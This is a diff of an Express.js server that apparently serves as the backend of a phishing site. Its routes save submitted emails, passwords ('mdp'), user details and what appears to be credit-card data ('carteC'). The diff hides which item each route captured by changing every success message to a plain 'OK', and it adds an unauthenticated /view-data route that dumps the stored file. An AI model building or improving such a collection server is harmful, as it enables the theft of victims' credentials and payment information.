@@ -38,7 +38,7 @@ app.post('/save-email', (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK email !');
+            res.status(200).send('OK');
         });
     });
 });
@@ -69,7 +69,7 @@ app.post("/save-mdp", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK psw!');
+            res.status(200).send('OK');
         });
     });
     
@@ -97,7 +97,7 @@ app.post("/infoUser", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK userI !');
+            res.status(200).send('OK');
         })
     })
 })
@@ -124,11 +124,28 @@ app.post("/carteC", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK  userC!');
+            res.status(200).send('OK');
         })
     })
 
 })
+
+app.get("/view-data", (req, res) => {
+    // get the path to the working directory
+    const workDir = process.env.RENDER_WORKDIR;
+  
+    // read the data from the JSON file
+    fs.readFile(`${workDir}/data.json`, (err, jsonData) => {
+      if (err) {
+        res.status(500).send('Internal server error');
+        return;
+      }
+  
+      // parse the JSON data and send it to the client
+      let mdpData = JSON.parse(jsonData);
+      res.send(mdpData);
+    });
+  });
 
 // End Request 
 
